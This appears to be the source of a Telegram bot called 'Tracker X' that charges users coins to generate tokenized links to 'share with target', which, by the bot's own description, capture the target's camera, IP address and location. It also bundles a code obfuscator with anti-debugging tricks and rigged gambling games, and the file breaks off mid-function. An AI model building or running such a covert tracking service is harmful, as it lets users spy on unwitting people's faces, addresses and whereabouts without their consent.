// =====================================================
// 🔱 TRACKER X v3.0 - COMPLETE WORKING EDITION 🔱
// =====================================================
// 👨‍💻 Dev: @Mrddev | 📢 Channel: @devxtechzone
// 💰 New Users: 5 COINS | Tracking: 5 COINS | Referral: 2 COINS
// 🎮 GAMES: Hard win rates (10-40% chance) | You WILL lose coins!
// 👑 ADMIN: Full control | Add/Remove coins | Generate codes | Broadcast | Blacklist
// 🛠 DEV TOOLS: Code Obfuscator | Minifier | Validator | Encrypt/Decrypt | Base64 | Hash | And more!
// =====================================================

const { Telegraf, Markup } = require("telegraf");
const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const crypto = require("crypto");
const vm = require("vm");

const bot = new Telegraf(process.env.BOT_TOKEN);
const app = express();

// ===== MIDDLEWARE =====
app.use(bodyParser.json({ limit: "50mb" }));
app.use(express.static(path.join(__dirname, "public")));

// ===== CONFIG =====
const DOMAIN = "https://virtualnumbersfree.onrender.com";
const CHANNEL_USERNAME = "@devxtechzone";
const OWNER_ID = 6170894121;
const BOT_VERSION = "3.0.0";

// ========== COIN SETTINGS ==========
const TRACKING_COST = 5;
const NEW_USER_COINS = 5;
const REFERRAL_REWARD = 2;
const DAILY_REWARD = 1;
const WORK_MIN = 1;
const WORK_MAX = 2;
const GAME_BET = 1;

// ========== DATABASES ==========
const users = new Map();
const activeTokens = new Map();
const redeemCodes = new Map();
const userWarnings = new Map();
const activeChats = new Map();
const userWorkCooldown = new Map();
const transactions = [];
const globalBlacklist = new Set();
let maintenanceMode = false;

// ----- GROUP FEATURES DATABASES -----
const groupSettings = new Map();
const groupBans = new Map();
const groupMutes = new Map();
const antilinkGroups = new Set();
const antispamGroups = new Set();
const antispamUsers = new Map();
const welcomeMessages = new Map();
const goodbyeMessages = new Map();
const filterWords = new Map();
const levelGroups = new Set();
const stickyMessages = new Map();
const captchaGroups = new Set();
const captchaUsers = new Map();
const ticketSystem = new Map();
const activePolls = new Map();
const activeGiveaways = new Map();
const giveawayEntries = new Map();
const tagAllCooldown = new Map();
const autoResponses = new Map();
const userNotes = new Map();
const userReminders = new Map();
const afkUsers = new Map();

// Stats
const botStats = {
  startTime: Date.now(),
  totalCommands: 0,
  totalMessages: 0,
  totalUsers: 0,
  totalGroups: 0,
  totalCoinsGiven: 0,
  totalHacksUsed: 0,
  totalReferrals: 0,
  totalRedeems: 0,
  totalObfuscations: 0
};

const TOKEN_EXPIRY_MS = 10 * 60 * 1000;

// Clean expired tokens
setInterval(() => {
  const now = Date.now();
  for (const [token, data] of activeTokens) {
    if (now - data.createdAt > TOKEN_EXPIRY_MS) {
      activeTokens.delete(token);
    }
  }
}, 60000);

// ========== CODE OBFUSCATOR FUNCTIONS ==========
function obfuscateCode(code) {
  try {
    let obfuscated = code.replace(/\/\/.*$/gm, '')
                         .replace(/\/\*[\s\S]*?\*\//g, '');
    obfuscated = obfuscated.replace(/\s+/g, ' ');
    
    const varNames = new Set();
    const varRegex = /\b(let|const|var)\s+([a-zA-Z_][a-zA-Z0-9_]*)/g;
    let match;
    while ((match = varRegex.exec(obfuscated)) !== null) {
      varNames.add(match[2]);
    }
    
    const replacements = new Map();
    for (const name of varNames) {
      const randomName = '_' + crypto.randomBytes(4).toString('hex');
      replacements.set(name, randomName);
    }
    
    for (const [oldName, newName] of replacements) {
      const regex = new RegExp(`\\b${oldName}\\b`, 'g');
      obfuscated = obfuscated.replace(regex, newName);
    }
    
    obfuscated = obfuscated.replace(/(['"])(.*?)\1/g, (match, quote, str) => {
      const encoded = Buffer.from(str).toString('base64');
      return `atob('${encoded}')`;
    });
    
    const antiDebug = `(function(){const start=performance.now();debugger;const end=performance.now();if(end-start>100){console.clear();setTimeout(()=>{location.reload();},100);}})();`;
    obfuscated = antiDebug + obfuscated;
    
    return {
      success: true,
      obfuscated: obfuscated,
      originalLength: code.length,
      obfuscatedLength: obfuscated.length,
      compression: Math.round((1 - obfuscated.length / code.length) * 100)
    };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

function minifyCode(code) {
  try {
    let minified = code.replace(/\/\/.*$/gm, '')
                       .replace(/\/\*[\s\S]*?\*\//g, '')
                       .replace(/\s+/g, ' ')
                       .replace(/;\s*/g, ';')
                       .replace(/\{\s+/g, '{')
                       .replace(/\s+\}/g, '}')
                       .trim();
    return { success: true, minified: minified };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

function validateCode(code) {
  try {
    new vm.Script(code);
    return { valid: true };
  } catch (err) {
    return { valid: false, error: err.message };
  }
}

// ========== HELPER FUNCTIONS ==========
function generateReferralCode(userId) {
  return crypto.createHash('md5').update(userId + Date.now().toString()).digest('hex').substring(0, 8).toUpperCase();
}

function getReferralLink(userId) {
  return `https://t.me/${bot.botInfo?.username || 'TrackerXBot'}?start=ref_${userId}`;
}

function formatMessage(text) {
  return text.trim().replace(/ {12}/g, '');
}

function generateToken() {
  return crypto.randomBytes(8).toString("hex");
}

// ========== INITIALIZE USER ==========
function initUser(userId, referrerId = null) {
  if (!users.has(userId)) {
    const userData = {
      id: userId,
      joinDate: Date.now(),
      lastActive: Date.now(),
      coins: NEW_USER_COINS,
      bank: 0,
      totalEarned: NEW_USER_COINS,
      totalSpent: 0,
      referrals: 0,
      referrer: referrerId,
      referralCode: generateReferralCode(userId),
      usedHacks: 0,
      successfulHacks: 0,
      level: 1,
      xp: 0,
      dailyStreak: 0,
      lastDaily: null,
      gamesPlayed: 0,
      gamesWon: 0,
      gamesLost: 0,
      obfuscationsUsed: 0,
      badges: ["🎁 New User"],
      warnings: 0,
      afk: null,
      notes: [],
      reminders: []
    };
    
    users.set(userId, userData);
    botStats.totalUsers++;
    botStats.totalCoinsGiven += NEW_USER_COINS;
    
    if (referrerId && users.has(referrerId)) {
      const referrer = users.get(referrerId);
      referrer.coins += REFERRAL_REWARD;
      referrer.referrals += 1;
      referrer.totalEarned += REFERRAL_REWARD;
      referrer.badges.push("🌟 Recruiter");
      users.set(referrerId, referrer);
      botStats.totalReferrals++;
      botStats.totalCoinsGiven += REFERRAL_REWARD;
      
      bot.telegram.sendMessage(referrerId, formatMessage(`
╔══════════════════════════╗
║  🎉 NEW REFERRAL! 🎉     ║
╚══════════════════════════╝

👤 Someone joined using your link!

💰 <b>Reward:</b> <code>+${REFERRAL_REWARD} COINS</code>

📊 <b>Your Stats:</b>
• Total Coins: ${referrer.coins}
• Referrals: ${referrer.referrals}
      `));
    }
  }
  return users.get(userId);
}

function canHack(userId) {
  const user = users.get(userId);
  return user && user.coins >= TRACKING_COST;
}

function useHack(userId) {
  const user = users.get(userId);
  if (user && user.coins >= TRACKING_COST) {
    user.coins -= TRACKING_COST;
    user.usedHacks += 1;
    users.set(userId, user);
    botStats.totalHacksUsed++;
    return true;
  }
  return false;
}

function addCoins(userId, amount, reason) {
  const user = users.get(userId);
  if (user) {
    user.coins += amount;
    user.totalEarned += amount;
    users.set(userId, user);
    botStats.totalCoinsGiven += amount;
    transactions.push({ userId, amount, reason, date: Date.now() });
    return true;
  }
  return false;
}

function removeCoins(userId, amount, reason) {
  const user = users.get(userId);
  if (user && user.coins >= amount) {
    user.coins -= amount;
    user.totalSpent += amount;
    users.set(userId, user);
    return true;
  }
  return false;
}

function addXP(userId, amount) {
  const user = users.get(userId);
  if (user) {
    user.xp += amount;
    const xpNeeded = user.level * 100;
    
    if (user.xp >= xpNeeded) {
      user.xp -= xpNeeded;
      user.level++;
      const levelReward = user.level * 2;
      user.coins += levelReward;
      
      bot.telegram.sendMessage(userId, formatMessage(`
╔══════════════════════════╗
║  🎉 LEVEL UP! 🎉         ║
╚══════════════════════════╝

Congratulations! You reached <b>Level ${user.level}</b>!

💰 Reward: <code>+${levelReward} COINS</code>
      `));
    }
    users.set(userId, user);
    return true;
  }
  return false;
}

function generateRedeemCode(coins, maxUses = 1, expiresInHours = 24) {
  const code = crypto.randomBytes(6).toString("hex").toUpperCase();
  redeemCodes.set(code, {
    coins: coins,
    usedBy: [],
    maxUses: maxUses,
    remainingUses: maxUses,
    createdBy: OWNER_ID,
    createdAt: Date.now(),
    expiresAt: Date.now() + (expiresInHours * 60 * 60 * 1000)
  });
  return code;
}

function redeemCode(userId, code) {
  const codeData = redeemCodes.get(code.toUpperCase());
  if (!codeData) return { success: false, message: "❌ Invalid code!" };
  if (Date.now() > codeData.expiresAt) return { success: false, message: "❌ Code expired!" };
  if (codeData.remainingUses <= 0) return { success: false, message: "❌ Code used up!" };
  if (codeData.usedBy.includes(userId)) return { success: false, message: "❌ Already used!" };
  
  addCoins(userId, codeData.coins, `Redeemed code: ${code}`);
  codeData.usedBy.push(userId);
  codeData.remainingUses--;
  redeemCodes.set(code, codeData);
  botStats.totalRedeems++;
  return { success: true, message: `✅ Redeemed ${codeData.coins} coins!`, coins: codeData.coins };
}

// ========== LEADERBOARD FUNCTIONS ==========
function getLeaderboard(type, limit = 10) {
  let sorted = [];
  
  switch(type) {
    case 'coins':
      sorted = Array.from(users.values()).sort((a, b) => b.coins - a.coins);
      break;
    case 'games':
      sorted = Array.from(users.values()).sort((a, b) => b.gamesWon - a.gamesWon);
      break;
    case 'referrals':
      sorted = Array.from(users.values()).sort((a, b) => b.referrals - a.referrals);
      break;
    case 'level':
      sorted = Array.from(users.values()).sort((a, b) => b.level - a.level);
      break;
    case 'hacks':
      sorted = Array.from(users.values()).sort((a, b) => b.usedHacks - a.usedHacks);
      break;
    case 'obfuscations':
      sorted = Array.from(users.values()).sort((a, b) => (b.obfuscationsUsed || 0) - (a.obfuscationsUsed || 0));
      break;
    default:
      sorted = Array.from(users.values()).sort((a, b) => b.coins - a.coins);
  }
  
  return sorted.slice(0, limit);
}

// ========== FORCE JOIN CHECK ==========
async function isUserJoined(ctx) {
  try {
    const member = await ctx.telegram.getChatMember(CHANNEL_USERNAME, ctx.from.id);
    return ["creator", "administrator", "member"].includes(member.status);
  } catch {
    return false;
  }
}

// ========== DOPE MAIN MENU ==========
function mainMenu(ctx) {
  const referralLink = getReferralLink(ctx.from.id);
  return Markup.inlineKeyboard([
    [Markup.button.callback("🎯 TRACKING", "tracking_menu"), Markup.button.callback("👑 GROUP", "group_menu")],
    [Markup.button.callback("🎮 GAMES", "games_menu"), Markup.button.callback("💰 ECONOMY", "economy_menu")],
    [Markup.button.callback("🏆 LEADERBOARD", "leaderboard_menu"), Markup.button.callback("🛠 DEV TOOLS", "devtools_menu")],
    [Markup.button.callback("👤 PROFILE", "profile"), Markup.button.callback("📊 STATS", "stats")],
    [Markup.button.callback("🎁 REDEEM", "redeem_menu"), Markup.button.callback("🔗 REFERRAL", "referral_info")],
    [Markup.button.url("📢 CHANNEL", "https://t.me/devxtechzone"), Markup.button.url("👨‍💻 DEV", "https://t.me/Mrddev")],
    [Markup.button.url("🔗 MY REFERRAL LINK", referralLink)]
  ]);
}

// ========== LEADERBOARD MENU ==========
function leaderboardMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback("💰 COINS", "leaderboard_coins"), Markup.button.callback("🎮 GAMES", "leaderboard_games")],
    [Markup.button.callback("👥 REFERRALS", "leaderboard_referrals"), Markup.button.callback("⭐ LEVEL", "leaderboard_level")],
    [Markup.button.callback("🔧 TOP HACKERS", "leaderboard_hacks"), Markup.button.callback("🔒 OBFUSCATORS", "leaderboard_obfuscators")],
    [Markup.button.callback("◀️ BACK", "main_back")]
  ]);
}

// ========== TRACKING MENU ==========
function trackingMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback("🎱 POOL TRACKING", "pool"), Markup.button.callback("⚡ NORMAL", "normal")],
    [Markup.button.callback("◀️ BACK", "main_back")]
  ]);
}

// ========== GROUP MENU ==========
function groupMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback("🔊 TAG ALL", "tagall"), Markup.button.callback("👋 WELCOME", "set_welcome")],
    [Markup.button.callback("👋 GOODBYE", "set_goodbye"), Markup.button.callback("🚫 ANTILINK", "antilink_toggle")],
    [Markup.button.callback("🛡️ ANTISPAM", "antispam_toggle"), Markup.button.callback("⚠️ WARN", "warn_user")],
    [Markup.button.callback("🔨 KICK", "kick_user"), Markup.button.callback("🚫 BAN", "ban_user")],
    [Markup.button.callback("🔇 MUTE", "mute_user"), Markup.button.callback("📊 GROUP STATS", "group_stats")],
    [Markup.button.callback("◀️ BACK", "main_back")]
  ]);
}

// ========== GAMES MENU ==========
function gamesMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback("🎲 DICE (33%)", "dice_game"), Markup.button.callback("🎰 SLOTS (15%)", "slots_game")],
    [Markup.button.callback("🔢 GUESS (10%)", "guess_game"), Markup.button.callback("✊ RPS (33%)", "rps_game")],
    [Markup.button.callback("🪙 COIN FLIP (40%)", "coinflip"), Markup.button.callback("🔥 HIGH RISK (20%)", "high_risk")],
    [Markup.button.callback("🏆 LEADERBOARD", "game_leaderboard"), Markup.button.callback("📊 MY STATS", "game_stats")],
    [Markup.button.callback("◀️ BACK", "main_back")]
  ]);
}

// ========== ECONOMY MENU ==========
function economyMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback("💰 DAILY", "daily"), Markup.button.callback("💼 WORK", "work")],
    [Markup.button.callback("🏦 BANK", "bank_menu"), Markup.button.callback("💸 TRANSFER", "transfer_menu")],
    [Markup.button.callback("🏆 LEADERBOARD", "coin_leaderboard"), Markup.button.callback("🎁 REFERRAL", "referral_info")],
    [Markup.button.callback("◀️ BACK", "main_back")]
  ]);
}

// ========== DEV TOOLS MENU ==========
function devToolsMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback("🔒 OBFUSCATE", "obfuscate_code"), Markup.button.callback("🗜️ MINIFY", "minify_code")],
    [Markup.button.callback("✅ VALIDATE", "validate_code"), Markup.button.callback("🔐 ENCRYPT", "encrypt")],
    [Markup.button.callback("🔓 DECRYPT", "decrypt"), Markup.button.callback("📝 BASE64", "base64")],
    [Markup.button.callback("🔢 HASH", "hash"), Markup.button.callback("⏰ TIMESTAMP", "timestamp")],
    [Markup.button.callback("🎲 RANDOM", "random"), Markup.button.callback("📋 NOTE", "note")],
    [Markup.button.callback("⏰ REMINDER", "reminder"), Markup.button.callback("💤 AFK", "afk")],
    [Markup.button.callback("🔍 WHOIS", "whois"), Markup.button.callback("📊 SYSTEM", "system_info")],
    [Markup.button.callback("◀️ BACK", "main_back")]
  ]);
}

// ========== MIDDLEWARE ==========
bot.use(async (ctx, next) => {
  if (!ctx.from || !ctx.chat || ctx.chat.type === "channel") return;
  if (ctx.callbackQuery && ctx.callbackQuery.data === "check_join") return next();
  
  // Check blacklist
  if (globalBlacklist.has(ctx.from.id)) {
    return ctx.reply("🚫 You have been banned from using this bot!");
  }
  
  // Check maintenance mode
  if (maintenanceMode && ctx.from.id !== OWNER_ID) {
    return ctx.reply("🛠️ Bot is under maintenance. Please try again later.");
  }
  
  const joined = await isUserJoined(ctx);
  if (!joined) {
    return ctx.telegram.sendMessage(ctx.from.id, formatMessage(`
╔══════════════════════════╗
║  🚫 ACCESS LOCKED       ║
╚══════════════════════════╝

🔐 You must join our channel first!

👇 <b>Click below to join</b>
    `), {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📢 JOIN CHANNEL", url: "https://t.me/devxtechzone" }],
          [{ text: "✅ I JOINED", callback_data: "check_join" }]
        ]
      }
    });
  }
  return next();
});

// ========== START COMMAND ==========
bot.start(async (ctx) => {
  let referrerId = null;
  const args = ctx.message.text.split(" ");
  if (args[1] && args[1].startsWith("ref_")) {
    referrerId = parseInt(args[1].replace("ref_", ""));
    if (isNaN(referrerId)) referrerId = null;
  }
  
  const user = initUser(ctx.from.id, referrerId);
  user.lastActive = Date.now();
  users.set(ctx.from.id, user);
  
  const referralLink = getReferralLink(ctx.from.id);
  
  await ctx.replyWithPhoto("https://files.catbox.moe/v75lmb.jpeg", {
    caption: formatMessage(`
╔══════════════════════════════════╗
║     🔱 TRACKER X v3.0           ║
║     ⚡ COMPLETE EDITION         ║
╚══════════════════════════════════╝

✨ <b>Welcome ${ctx.from.first_name}!</b>

┌─────────────────────────────────┐
│ 💰 Balance: ${user.coins} coins          │
│ 📊 Level: ${user.level}                    │
│ 👥 Referrals: ${user.referrals}            │
└─────────────────────────────────┘

🎁 <b>You got ${NEW_USER_COINS} FREE coins!</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>🔗 Your Referral Link:</b>
<code>${referralLink}</code>

<i>Share this link - earn ${REFERRAL_REWARD} coins per referral!</i>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎯 <b>Select a module below</b>
    `),
    parse_mode: "HTML",
    ...mainMenu(ctx)
  });
});

bot.action("check_join", async (ctx) => {
  const joined = await isUserJoined(ctx);
  if (!joined) {
    return ctx.answerCbQuery("❌ Join channel first!", { show_alert: true });
  }
  await ctx.answerCbQuery("✅ Access Granted! 🎉");
  await ctx.deleteMessage();
  
  const user = initUser(ctx.from.id);
  await ctx.replyWithPhoto("https://files.catbox.moe/v75lmb.jpeg", {
    caption: formatMessage(`
╔══════════════════════════════════╗
║     🔱 TRACKER X v3.0           ║
║     ⚡ COMPLETE EDITION         ║
╚══════════════════════════════════╝

✅ <b>Access Unlocked!</b>

💰 <b>Your Balance:</b> ${user.coins} coins

🎯 <b>Select a module below</b>
    `),
    parse_mode: "HTML",
    ...mainMenu(ctx)
  });
});

// ========== TRACKING MODES ==========
bot.action("tracking_menu", async (ctx) => {
  await ctx.editMessageCaption("🎯 TRACKER X MODULE\n\n⚠️ Cost: 5 coins per hack\n⏱️ Token expires in 10 minutes\n📸 Captures: Camera + IP + Location", {
    parse_mode: "HTML",
    ...trackingMenu()
  });
});

bot.action("pool", async (ctx) => {
  if (!canHack(ctx.from.id)) {
    return ctx.reply(formatMessage(`
❌ <b>Insufficient Coins!</b>

You need <code>${TRACKING_COST} coins</code> to use tracking.
Current balance: ${users.get(ctx.from.id)?.coins || 0} coins

🎁 <b>Ways to earn coins:</b>
• Daily reward - ${DAILY_REWARD} coin
• Work - ${WORK_MIN}-${WORK_MAX} coins
• Referrals - ${REFERRAL_REWARD} coins each
• Redeem codes
• Play games - ${GAME_BET} coin per game
    `), { parse_mode: "HTML" });
  }
  
  useHack(ctx.from.id);
  const token = generateToken();
  
  activeTokens.set(token, {
    chatId: ctx.chat.id,
    userId: ctx.from.id,
    mode: "pool",
    createdAt: Date.now()
  });
  
  setTimeout(() => activeTokens.delete(token), TOKEN_EXPIRY_MS);
  
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  🎱 POOL MODE ACTIVE    ║
╚══════════════════════════╝

✅ Tracking initialized!
💰 <b>Coins deducted:</b> <code>-${TRACKING_COST}</code>
⏱️ <b>Token expires in:</b> 10 minutes

<b>Share this link with target:</b>
<code>${DOMAIN}?token=${token}</code>

⚠️ <i>Link expires in 10 minutes!</i>
  `), { parse_mode: "HTML", ...Markup.inlineKeyboard([
    [Markup.button.callback("◀️ BACK", "tracking_menu")]
  ]) });
});

bot.action("normal", async (ctx) => {
  if (!canHack(ctx.from.id)) {
    return ctx.reply(formatMessage(`
❌ <b>Insufficient Coins!</b>

You need <code>${TRACKING_COST} coins</code> to use tracking.
Current balance: ${users.get(ctx.from.id)?.coins || 0} coins
    `), { parse_mode: "HTML" });
  }
  
  useHack(ctx.from.id);
  const token = generateToken();
  
  activeTokens.set(token, {
    chatId: ctx.chat.id,
    userId: ctx.from.id,
    mode: "normal",
    createdAt: Date.now()
  });
  
  setTimeout(() => activeTokens.delete(token), TOKEN_EXPIRY_MS);
  
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  ⚡ NORMAL MODE ACTIVE  ║
╚══════════════════════════╝

✅ Tracking initialized!
💰 <b>Coins deducted:</b> <code>-${TRACKING_COST}</code>
⏱️ <b>Token expires in:</b> 10 minutes

<b>Share this link:</b>
<code>${DOMAIN}?token=${token}</code>
  `), { parse_mode: "HTML", ...Markup.inlineKeyboard([
    [Markup.button.callback("◀️ BACK", "tracking_menu")]
  ]) });
});

// ========== GAMES - HARD WIN RATES ==========
bot.action("games_menu", async (ctx) => {
  await ctx.editMessageCaption("🎮 GAMES ZONE\n\n💰 Cost: 1 coin per game\n⚠️ Hard win rates - you WILL lose coins!\n🎯 Win up to 10x your bet!\n🏆 Climb the leaderboard!", {
    parse_mode: "HTML",
    ...gamesMenu()
  });
});

// DICE - 33% win rate
bot.action("dice_game", async (ctx) => {
  const user = initUser(ctx.from.id);
  const bet = GAME_BET;
  
  if (user.coins < bet) return ctx.reply(`❌ Need ${bet} coin to play!`);
  
  removeCoins(ctx.from.id, bet, "Dice bet");
  const roll = Math.floor(Math.random() * 6) + 1;
  const win = roll === 5 || roll === 6;
  
  if (win) {
    const winnings = bet * 2;
    addCoins(ctx.from.id, winnings, "Won dice game");
    user.gamesWon++;
    await ctx.replyWithDice();
    await ctx.reply(`🎲 You rolled ${roll} and WON!\n💰 You won ${winnings} coins!`);
  } else {
    await ctx.replyWithDice();
    await ctx.reply(`🎲 You rolled ${roll} and LOST!\n💸 You lost ${bet} coin!`);
    user.gamesLost++;
  }
  
  user.gamesPlayed++;
  users.set(ctx.from.id, user);
});

// SLOTS - 15% pair, 2% jackpot
bot.action("slots_game", async (ctx) => {
  const user = initUser(ctx.from.id);
  const bet = GAME_BET;
  
  if (user.coins < bet) return ctx.reply(`❌ Need ${bet} coin to play!`);
  
  removeCoins(ctx.from.id, bet, "Slots bet");
  
  const slots = ["🍒", "🍊", "🍋", "🍉", "⭐", "💎"];
  const result = [
    slots[Math.floor(Math.random() * slots.length)],
    slots[Math.floor(Math.random() * slots.length)],
    slots[Math.floor(Math.random() * slots.length)]
  ];
  
  const isJackpot = result[0] === result[1] && result[1] === result[2];
  const isPair = !isJackpot && (result[0] === result[1] || result[1] === result[2] || result[0] === result[2]);
  
  let winnings = 0;
  let message = "";
  
  if (isJackpot) {
    winnings = bet * 10;
    message = `🎰 JACKPOT! ${result.join(" ")}\n💰 You won ${winnings} coins!`;
  } else if (isPair) {
    winnings = bet * 2;
    message = `🎰 Pair! ${result.join(" ")}\n💰 You won ${winnings} coins!`;
  } else {
    message = `🎰 ${result.join(" ")}\n💸 You lost ${bet} coin.`;
    user.gamesLost++;
  }
  
  if (winnings > 0) {
    addCoins(ctx.from.id, winnings, "Won slots");
    user.gamesWon++;
  }
  
  user.gamesPlayed++;
  users.set(ctx.from.id, user);
  await ctx.reply(message);
});

// GUESS - 10% win rate
bot.action("guess_game", async (ctx) => {
  await ctx.reply("🔢 Guess a number between 1-10!\nUse: /guess <number>\nCost: 1 coin\n⚠️ Only 10% chance to win!");
});

bot.command("guess", async (ctx) => {
  const user = initUser(ctx.from.id);
  const args = ctx.message.text.split(" ");
  const guess = parseInt(args[1]);
  const number = Math.floor(Math.random() * 10) + 1;
  const bet = GAME_BET;
  
  if (isNaN(guess) || guess < 1 || guess > 10) return ctx.reply("Guess a number 1-10!");
  if (user.coins < bet) return ctx.reply(`❌ Need ${bet} coin!`);
  
  removeCoins(ctx.from.id, bet, "Guess game");
  
  if (guess === number) {
    const winnings = bet * 5;
    addCoins(ctx.from.id, winnings, "Won guess game");
    user.gamesWon++;
    await ctx.reply(`🎉 Correct! The number was ${number}! You won ${winnings} coins!`);
  } else {
    await ctx.reply(`❌ Wrong! The number was ${number}. You lost ${bet} coin!`);
    user.gamesLost++;
  }
  
  user.gamesPlayed++;
  users.set(ctx.from.id, user);
});

// RPS - 33% win rate
bot.action("rps_game", async (ctx) => {
  await ctx.reply("✊ Rock Paper Scissors!\nUse: /rps <rock/paper/scissors>\nCost: 1 coin\n⚠️ Only 33% chance to win!");
});

bot.command("rps", async (ctx) => {
  const user = initUser(ctx.from.id);
  const args = ctx.message.text.split(" ");
  const choice = args[1]?.toLowerCase();
  const bet = GAME_BET;
  
  if (!["rock", "paper", "scissors"].includes(choice)) return ctx.reply("Choose rock, paper, or scissors!");
  if (user.coins < bet) return ctx.reply(`❌ Need ${bet} coin!`);
  
  const botChoice = ["rock", "paper", "scissors"][Math.floor(Math.random() * 3)];
  let result;
  
  if (choice === botChoice) result = "tie";
  else if (
    (choice === "rock" && botChoice === "scissors") ||
    (choice === "paper" && botChoice === "rock") ||
    (choice === "scissors" && botChoice === "paper")
  ) result = "win";
  else result = "lose";
  
  removeCoins(ctx.from.id, bet, "RPS game");
  
  if (result === "win") {
    const winnings = bet * 2;
    addCoins(ctx.from.id, winnings, "Won RPS");
    user.gamesWon++;
    await ctx.reply(`✊ You chose ${choice}, I chose ${botChoice}!\n🎉 You WIN! +${winnings} coins!`);
  } else if (result === "lose") {
    await ctx.reply(`✊ You chose ${choice}, I chose ${botChoice}!\n💸 You LOSE! -${bet} coin!`);
    user.gamesLost++;
  } else {
    await ctx.reply(`✊ You chose ${choice}, I chose ${botChoice}!\n🤝 It's a TIE! Coins returned.`);
    addCoins(ctx.from.id, bet, "RPS tie");
  }
  
  user.gamesPlayed++;
  users.set(ctx.from.id, user);
});

// COIN FLIP - 40% win rate
bot.action("coinflip", async (ctx) => {
  const user = initUser(ctx.from.id);
  const bet = GAME_BET;
  
  if (user.coins < bet) return ctx.reply(`❌ Need ${bet} coin to play!`);
  
  removeCoins(ctx.from.id, bet, "Coin flip bet");
  const flip = Math.random() < 0.4 ? "HEADS" : "TAILS";
  const win = flip === "HEADS";
  
  if (win) {
    const winnings = bet * 2;
    addCoins(ctx.from.id, winnings, "Won coin flip");
    user.gamesWon++;
    await ctx.reply(`🪙 Coin landed on ${flip}!\n🎉 You WIN! +${winnings} coins!`);
  } else {
    await ctx.reply(`🪙 Coin landed on ${flip}!\n💸 You LOST! -${bet} coin!`);
    user.gamesLost++;
  }
  
  user.gamesPlayed++;
  users.set(ctx.from.id, user);
});

// HIGH RISK - 20% win rate
bot.action("high_risk", async (ctx) => {
  const user = initUser(ctx.from.id);
  const bet = 2;
  
  if (user.coins < bet) return ctx.reply(`❌ Need ${bet} coins to play high risk!`);
  
  removeCoins(ctx.from.id, bet, "High risk bet");
  const win = Math.random() < 0.2;
  
  if (win) {
    const winnings = bet * 10;
    addCoins(ctx.from.id, winnings, "Won high risk game");
    user.gamesWon++;
    await ctx.reply(`🔥 HIGH RISK - YOU WON!\n💰 You won ${winnings} coins!`);
  } else {
    await ctx.reply(`💀 HIGH RISK - YOU LOST!\n💸 You lost ${bet} coins!`);
    user.gamesLost++;
  }
  
  user.gamesPlayed++;
  users.set(ctx.from.id, user);
});

// GAME STATS
bot.action("game_stats", async (ctx) => {
  const user = initUser(ctx.from.id);
  const winRate = user.gamesPlayed > 0 ? ((user.gamesWon / user.gamesPlayed) * 100).toFixed(1) : 0;
  
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  🎮 YOUR GAME STATS     ║
╚══════════════════════════╝

<b>📊 Overall Stats:</b>
• Games Played: ${user.gamesPlayed}
• Games Won: ${user.gamesWon}
• Games Lost: ${user.gamesLost}
• Win Rate: ${winRate}%

<b>💰 Coins:</b>
• Current Balance: ${user.coins}
• Total Earned: ${user.totalEarned}
• Total Spent: ${user.totalSpent}

<b>🏆 Achievements:</b>
${user.gamesWon >= 10 ? "• 🎖️ Novice Gambler" : ""}
${user.gamesWon >= 50 ? "• 🥈 Skilled Player" : ""}
${user.gamesWon >= 100 ? "• 🥇 Pro Gambler" : ""}
${user.gamesWon >= 500 ? "• 👑 Gambling Legend" : ""}

<i>Keep playing to improve your stats!</i>
  `), { parse_mode: "HTML" });
});

// ========== LEADERBOARDS ==========
bot.action("leaderboard_menu", async (ctx) => {
  await ctx.editMessageCaption("🏆 TRACKER X LEADERBOARDS\n\nView top users across different categories!", {
    parse_mode: "HTML",
    ...leaderboardMenu()
  });
});

bot.action("leaderboard_coins", async (ctx) => {
  const topUsers = getLeaderboard('coins', 10);
  let message = "🏆 **💰 RICHEST USERS** 🏆\n\n";
  for (let i = 0; i < topUsers.length; i++) {
    const user = topUsers[i];
    const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    message += `${medal} \`${user.id}\` - ${user.coins} coins\n`;
  }
  await ctx.reply(message, { parse_mode: "Markdown" });
});

bot.action("leaderboard_games", async (ctx) => {
  const topUsers = getLeaderboard('games', 10);
  let message = "🏆 **🎮 TOP GAMERS** 🏆\n\n";
  for (let i = 0; i < topUsers.length; i++) {
    const user = topUsers[i];
    const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    message += `${medal} \`${user.id}\` - ${user.gamesWon} wins\n`;
  }
  await ctx.reply(message, { parse_mode: "Markdown" });
});

bot.action("leaderboard_referrals", async (ctx) => {
  const topUsers = getLeaderboard('referrals', 10);
  let message = "🏆 **👥 TOP REFERRERS** 🏆\n\n";
  for (let i = 0; i < topUsers.length; i++) {
    const user = topUsers[i];
    const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    message += `${medal} \`${user.id}\` - ${user.referrals} referrals\n`;
  }
  await ctx.reply(message, { parse_mode: "Markdown" });
});

bot.action("leaderboard_level", async (ctx) => {
  const topUsers = getLeaderboard('level', 10);
  let message = "🏆 **⭐ TOP LEVELS** 🏆\n\n";
  for (let i = 0; i < topUsers.length; i++) {
    const user = topUsers[i];
    const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    message += `${medal} \`${user.id}\` - Level ${user.level}\n`;
  }
  await ctx.reply(message, { parse_mode: "Markdown" });
});

bot.action("leaderboard_hacks", async (ctx) => {
  const topUsers = getLeaderboard('hacks', 10);
  let message = "🏆 **🔧 TOP HACKERS** 🏆\n\n";
  for (let i = 0; i < topUsers.length; i++) {
    const user = topUsers[i];
